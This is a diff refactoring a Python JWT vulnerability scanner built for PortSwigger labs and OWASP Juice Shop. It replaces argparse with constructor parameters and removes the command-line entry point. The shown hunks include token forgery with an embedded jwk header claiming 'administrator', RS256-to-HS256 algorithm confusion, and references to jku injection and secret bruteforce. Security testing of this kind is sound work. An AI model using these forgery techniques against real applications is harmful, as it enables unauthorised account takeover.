@@ -4,7 +4,6 @@ JWT Security Scanner - Unified (PortSwigger + Juice Shop)
 Tests 8 Critical JWT Vulnerabilities (fully implemented)
 """
 
-import argparse
 import base64
 import json
 import sys
@@ -15,7 +14,7 @@ import time
 import re
 from typing import Optional
 from datetime import datetime
-from token_manager import TokenManager
+from .token_manager import TokenManager
 
 try:
     from cryptography.hazmat.primitives.asymmetric import rsa, padding
@@ -27,25 +26,65 @@ except ImportError:
 
 
 class JWTScanner:
-    def __init__(self, args):
-        self.url = args.url.rstrip('/')
-        self.login_endpoint = args.login_endpoint
-        self.protected_endpoint = args.protected_endpoint
-        self.token = args.token
-        self.username = args.username
-        self.password = args.password
-        self.auth_type = args.auth_type
+    """
+    JWT Security Scanner - tests 8 critical JWT vulnerabilities.
+
+    Args:
+        url: Base URL of the target application (e.g. https://target.com).
+        protected_endpoint: Path to the protected endpoint to test against (e.g. /admin).
+        login_endpoint: Path to the login endpoint for token acquisition (e.g. /api/login).
+        username: Username to authenticate with when using login_endpoint.
+        password: Password to authenticate with when using login_endpoint.
+        token: Pre-obtained JWT token. Use instead of login_endpoint/username/password.
+        auth_type: Authentication method for login requests. One of: json, form, basic, bearer.
+        wordlist: Path to a wordlist file for weak secret bruteforce (test 3).
+        output: Path for the JSON scan report output file.
+        verbose: Enable verbose logging for all severity levels.
+        timeout: HTTP request timeout in seconds.
+        max_secret_tests: Max number of secrets to test in bruteforce (0 = all).
+        jku_callback_server: URL of your controlled server for jku injection test (test 5).
+        token_fields: Comma-separated list of JSON fields to extract the token from in login responses.
+        username_field: JSON/form field name for the username in login requests.
+        password_field: JSON/form field name for the password in login requests.
+
+    """
+    def __init__(
+        self,
+        url: str,
+        protected_endpoint: str,
+        login_endpoint: str = None,
+        username: str = None,
+        password: str = None,
+        token: str = None,
+        auth_type: str = "json",
+        wordlist: str = "",
+        output: str = "jwt_scan_report.json",
+        verbose: bool = False,
+        timeout: int = 10,
+        max_secret_tests: int = 0,
+        jku_callback_server: str = "",
+        token_fields: str = "token,access_token,jwt,id_token",
+        username_field: str = "username",
+        password_field: str = "password",
+    ):
+        self.url = url.rstrip('/')
+        self.login_endpoint = login_endpoint
+        self.protected_endpoint = protected_endpoint
+        self.token = token
+        self.username = username
+        self.password = password
+        self.auth_type = auth_type
         self.session = requests.Session()
-        self.wordlist = args.wordlist
-        self.output = args.output
-        self.verbose = args.verbose
-        self.timeout = args.timeout
+        self.wordlist = wordlist
+        self.output = output
+        self.verbose = verbose
+        self.timeout = timeout
         self.results = []
-        self.max_secret_tests = args.max_secret_tests
-        self.jku_callback_server = args.jku_callback_server
-        self.token_fields = args.token_fields.split(',') if args.token_fields else ['token', 'access_token', 'jwt', 'id_token']
-        self.username_field = args.username_field
-        self.password_field = args.password_field
+        self.max_secret_tests = max_secret_tests
+        self.jku_callback_server = jku_callback_server
+        self.token_fields = token_fields.split(',') if token_fields else ['token', 'access_token', 'jwt', 'id_token']
+        self.username_field = username_field
+        self.password_field = password_field
 
         if self.login_endpoint and self.username and self.password:
             self.token_manager = TokenManager(scanner_callback=self.authenticate_and_get_token)
@@ -53,6 +92,16 @@ class JWTScanner:
             self.token_manager = TokenManager(scanner_callback=None)
             if self.token:
                 self.token_manager.set_token(self.token)
+
+    def __call__(self):
+        """
+        Execute the authentication flow.
+        """
+        if not self.token and (not self.login_endpoint or not self.username or not self.password):
+            print("ERROR: Provide --token or (--login-endpoint, --username, --password)")
+            sys.exit(1)
+
+        self.run()
 
     def log(self, msg, level="INFO"):
         ts = datetime.now().strftime("%H:%M:%S")
@@ -201,7 +250,6 @@ class JWTScanner:
         subjects = ["admin", "administrator"]
         vulnerable = False
 
-        # First, try with original token payload (most accurate)
         if self.token_manager.current_token:
             try:
                 parts = self.token_manager.current_token.split('.')
@@ -217,7 +265,6 @@ class JWTScanner:
             except Exception as e:
                 self.log(f"Error using original payload: {e}", "DEBUG")
 
-        # If not vulnerable yet, try admin and administrator subjects
         if not vulnerable:
             for sub in subjects:
                 try:
@@ -298,9 +345,7 @@ class JWTScanner:
             e_b64 = self.b64url_encode(nums.e.to_bytes((nums.e.bit_length()+7)//8, 'big'))
             jwk = {"kty": "RSA", "n": n_b64, "e": e_b64}
             header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
-            # Try both admin and administrator as fallback
-            sub = "administrator"  # PortSwigger expects this
-            payload = {"sub": sub, "iat": int(time.time()), "exp": int(time.time())+3600}
+            payload = {"sub": "administrator", "iat": int(time.time()), "exp": int(time.time())+3600}
             hb64 = self.b64url_encode(json.dumps(header))
             pb64 = self.b64url_encode(json.dumps(payload))
             signing_input = f"{hb64}.{pb64}".encode()
@@ -377,7 +422,6 @@ class JWTScanner:
         """Fully implement RS256 → HS256 attack using public key from JWKS endpoint."""
         self.log("Testing Vulnerability 7: Algorithm confusion (RS256→HS256)...", "INFO")
         try:
-            # Try to fetch public key from common endpoints
             public_key_data = None
             jwks_endpoints = [
                 f"{self.url}/.well-known/jwks.json",
@@ -397,7 +441,6 @@ class JWTScanner:
             if public_key_data and 'n' in public_key_data:
                 n_bytes = self.b64url_decode(public_key_data['n'])
                 header = {"alg": "HS256", "typ": "JWT"}
-                # Use the original token's subject if available, else admin
                 if self.token_manager.current_token:
                     parts = self.token_manager.current_token.split('.')
                     original_payload = json.loads(self.b64url_decode(parts[1]).decode('utf-8'))
@@ -509,35 +552,3 @@ class JWTScanner:
         self.test_7_algorithm_confusion()
         self.test_8_sql_injection()
         self.generate_report()
-
-
-def main():
-    parser = argparse.ArgumentParser(description="JWT Security Scanner (Unified)")
-    parser.add_argument("--url", required=True)
-    parser.add_argument("--protected-endpoint", required=True)
-    parser.add_argument("--login-endpoint")
-    parser.add_argument("--username")
-    parser.add_argument("--password")
-    parser.add_argument("--token")
-    parser.add_argument("--auth-type", choices=["json", "form", "basic", "bearer"], default="json")
-    parser.add_argument("--wordlist", default="")
-    parser.add_argument("--output", default="jwt_scan_report.json")
-    parser.add_argument("--verbose", action="store_true")
-    parser.add_argument("--timeout", type=int, default=10)
-    parser.add_argument("--max-secret-tests", type=int, default=0)
-    parser.add_argument("--jku-callback-server", default="")
-    parser.add_argument("--token-fields", default="token,access_token,jwt,id_token")
-    parser.add_argument("--username-field", default="username")
-    parser.add_argument("--password-field", default="password")
-
-    args = parser.parse_args()
-    if not args.token and (not args.login_endpoint or not args.username or not args.password):
-        print("ERROR: Provide --token or (--login-endpoint, --username, --password)")
-        sys.exit(1)
-
-    scanner = JWTScanner(args)
-    scanner.run()
-
-
-if __name__ == "__main__":
-    main()
